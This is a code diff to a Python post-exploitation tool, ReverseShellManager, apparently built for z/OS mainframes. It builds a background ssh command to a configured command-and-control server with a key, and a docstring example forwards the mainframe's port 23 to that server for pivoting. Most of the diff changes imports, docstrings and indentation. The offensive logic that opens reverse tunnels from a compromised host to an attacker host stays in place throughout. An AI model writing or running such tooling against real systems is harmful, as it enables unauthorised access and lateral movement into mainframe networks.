@@ -2,14 +2,12 @@
 
 Also provide some z/OS and ssh pivoting specific commands"""
 import argparse
-import sys
-from cmd import Cmd
-from configparser import ConfigParser, ExtendedInterpolation
 from string import Template
-from . import WrappingShell
+from zosutils import WrappingShell
 
 
 class ReverseShellManager(WrappingShell):
+    """Extend zosutils.WrappingShell with post-exploitation specific commands"""
     REVERSE_SH_SSH = 'ssh -i $KEYNAME $CCU@$CCS -p $CCP -o UserKnownHostsFile=$KNOWNHOSTSFILE -o StrictHostKeyChecking=yes -N '
 
     def __init__(self, cmdline, codepage, name='shell', sync_stdout=False, config=None):
@@ -23,7 +21,14 @@ class ReverseShellManager(WrappingShell):
         self.default(real_args)
 
     def do__runssh(self, args):
-        """Add the args options to a ssh command created from self.status_config"""
+        """Add the command line arguments to a non interactive ssh reverse
+connection.
+
+All the parameters of _runssh are passed to the same ssh command used to
+establish the reverse connection.
+EXAMPLE:
+    Forwarding port 23 to port 2323 from the mainframe to the cc server:
+    > _runssh -R 2323:localhost:23"""
         config = self.status_config
         ssh_step = Template(self.REVERSE_SH_SSH).substitute(
                 KEYNAME=config['ftpkeyname'],
@@ -32,7 +37,7 @@ class ReverseShellManager(WrappingShell):
                 CCS=config['cc_server'],
                 CCP=config['cc_port'],
                 NCIP=config['ebcdiccat_host'],
-                NCP=config['ebcdiccat_port'],
+                NCP=config['ebcdiccat_port']
                 )
         run_ssh_command = ssh_step + args + '&'
         print('Running in background: ' + run_ssh_command)
@@ -57,9 +62,9 @@ if __name__ == '__main__':
 
     if local_arguments.name is None:
         shell = ReverseShellManager(wrapped_command, wrapping_encoding,
-                              sync_stdout=local_arguments.asyncio)
+                                    sync_stdout=local_arguments.asyncio)
     else:
         shell = ReverseShellManager(wrapped_command, wrapping_encoding,
-                              name=local_arguments.name,
-                              sync_stdout=local_arguments.asyncio)
+                                    name=local_arguments.name,
+                                    sync_stdout=local_arguments.asyncio)
     shell.cmdloop()
